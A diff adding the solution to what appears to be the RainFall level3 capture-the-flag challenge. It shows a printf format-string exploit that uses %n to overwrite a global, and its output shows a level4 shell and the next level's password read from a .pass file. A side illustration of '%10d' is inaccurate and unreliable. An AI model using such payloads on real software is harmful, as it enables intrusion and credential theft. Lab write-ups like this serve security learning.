@@ -65,3 +65,42 @@ if __false__ :
 8048518 <+116>:	leave
 8048519 <+117>:	ret
 ```
+---
+#### Solution :
+---
+- will use the __%n printf__
+read about it : https://www.geeksforgeeks.org/g-fact-31/
+and : https://stackoverflow.com/questions/44543540/index-specification-in-printf-format-specifier
+1 - use normal characters to fill the 64 size of M 
+```shell
+(python -c 'print "\x08\x04\x98\x8c"[::-1] + "1337" * 15 + "%4$n"'; cat) | ./level3
+                             4             +       60    = 64 into the address in the 4th index    
+or
+(python -c 'print "\x08\x04\x98\x8c"[::-1] + "A" * 64 + "%4$n"'; cat) | ./level3
+                             4             +       60    = 64 into the address in the 4th index 
+```
+output:
+```shell
+level3@RainFall:~$ (python -c 'print "\x08\x04\x98\x8c"[::-1] + "1337" * 15 + "%4$n"'; cat) | ./level3
+�133713371337133713371337133713371337133713371337133713371337
+Wait what?!
+pwd
+/home/user/level3
+cat /home/user/level4/.pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+```
+---
+2 - use the ___%nd___ printf format  where n is number of spaces to prefix the d number with
+`printf("[%10d]", 7)` --->  [&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1] --> length = 13 = `[`+`]`+`1`+`10 spaces`
+```shell
+level3@RainFall:~$ (python -c 'print "\x08\x04\x98\x8c"[::-1] + "%60d" + "%4$n"'; cat) | ./level3
+�                                                         512
+Wait what?!
+whoami
+level4
+pwd
+/home/user/level3
+cat /home/user/level4/.pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+
+```
